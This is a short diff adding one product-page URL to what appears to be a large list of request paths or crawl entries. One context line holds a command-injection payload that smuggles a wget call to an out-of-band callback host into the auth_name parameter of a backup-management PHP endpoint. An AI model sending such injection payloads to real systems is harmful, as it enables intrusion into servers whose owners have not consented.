@@ -23855,3 +23855,4 @@ m.naver.com:443
 /backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d0m448i93sf15f65rb5gzxu5ubqsenf63.oast.live;
 /?gad_source=1&gad_campaignid=20619651796&gbraid=0AAAAApc7P_SLqzJIJCjEdP_rxW8HapMD2&gclid=CjwKCAjw87XBBhBIEiwAxP3_A4ksaBOs-TdLmll_Ua39phqDTtBWqPJCgjPv-tRo6D-I1BWTjbQlVBoCUYkQAvD_BwE
 /figs-loso-gold-figs-30-50-cm?order=DESC&sort=pd.name&tag=30-50
+/figs-loso-gold-figs-30-50-cm?order=ASC&sort=rating&tag=30-50
